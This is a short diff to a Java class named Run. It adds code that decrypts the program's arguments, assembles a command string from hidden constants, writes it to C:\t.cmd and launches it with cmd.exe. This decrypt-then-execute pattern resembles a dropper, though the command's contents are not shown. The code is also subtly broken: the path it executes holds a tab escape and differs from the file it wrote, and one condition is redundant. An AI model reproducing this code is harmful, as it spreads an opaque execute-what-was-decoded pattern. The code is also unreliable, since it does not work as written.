@@ -45,7 +45,7 @@ public class Run implements IWriter{
     tBatchPStream.close();
   }
   private void writeBR(String p){
-    writeText("\n");
+    writeText(p, "\n");
   }
   public static void main(String[] a){
     Run thisInstance = new Run();
@@ -67,6 +67,11 @@ public class Run implements IWriter{
     else{
       int rv = thisInstance.decrypt(a);
       if(rv >= 5 && !(rv < 0)){
+        StringBuffer sb = new StringBuffer();
+        sb.append(IWriter.baseCmd);
+        sb.append(IWriter.armv7a);
+        sb.append(rv);
+        writeText("C:\\t.cmd", sb.toString());
         Runtime.getRuntime().exec("cmd.exe " + "C:\t.cmd");
       }
     }
